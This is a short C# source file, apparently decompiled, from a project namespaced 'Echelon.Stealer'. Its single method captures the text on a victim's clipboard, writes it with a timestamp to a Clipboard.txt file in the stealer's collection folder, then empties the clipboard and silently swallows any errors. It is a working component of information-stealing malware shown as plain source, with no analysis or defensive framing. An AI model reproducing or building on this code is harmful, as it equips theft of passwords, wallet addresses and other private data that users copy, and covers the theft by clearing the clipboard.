using System;
using System.IO;
using System.Windows;
using Echelon.Global;

namespace Echelon.Stealer.SystemsData
{
	// Token: 0x02000021 RID: 33
	public static class BuffBoard
	{
		// Token: 0x06000081 RID: 129 RVA: 0x0001B0D4 File Offset: 0x000192D4
		public static void GetClipboard(string Echelon_Dir)
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					File.WriteAllText(Echelon_Dir + "\\Clipboard.txt", string.Concat(new string[]
					{
						"[",
						Help.date,
						"]\r\n\r\n",
						ClipboardNative.GetText(),
						"\r\n\r\n"
					}));
					NativeMethods.EmptyClipboard();
				}
			}
			catch
			{
			}
		}
	}
}
